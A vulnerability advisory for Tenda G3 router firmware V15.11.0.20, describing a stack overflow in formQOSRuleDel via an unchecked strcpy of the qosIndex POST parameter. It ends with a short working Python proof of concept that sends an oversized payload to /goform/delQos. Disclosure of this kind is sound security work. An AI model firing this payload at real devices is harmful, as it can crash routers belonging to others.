## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3369.html

## Affected version

G3V3.0 V15.11.0.20

## Vulnerability details

The Tenda G3V3.0 V15.11.0.20 firmware has a stack overflow vulnerability in the `formQOSRuleDel` function. The `indexSet` variable receives the `qosIndex` parameter from a POST request and is directly assigned to `strcpy`. However, since the user can control the input of `qosIndex `, the statement`strcpy((char *)&input, (const char *)indexSet);` can cause a buffer overflow. The user-provided  `qosIndex` can exceed the capacity of the `input` array, triggering this security vulnerability.

![image-20240417100646839](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417100646839.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/delQos"
payload = b"a"*2000

data = {
        'qosIndex':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

